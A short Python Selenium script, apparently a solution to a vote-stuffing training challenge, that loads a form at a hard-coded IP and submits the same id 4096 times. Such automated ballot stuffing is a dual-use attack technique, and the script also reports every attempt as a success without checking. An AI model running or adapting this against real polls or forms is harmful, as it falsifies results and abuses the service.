#!/usr/bin/python3
# -*- coding: utf-8 -*-
from selenium import webdriver


id = '2714'
times = 4096
times_success = 0

driver = webdriver.Firefox()
driver.get('http://158.69.76.135/level1.php')


for i in range(times):
    driver.find_element_by_name('id').send_keys(id)
    driver.find_element_by_name('holdthedoor').click()
    times_success += 1
    print('success: {}'.format(times_success))
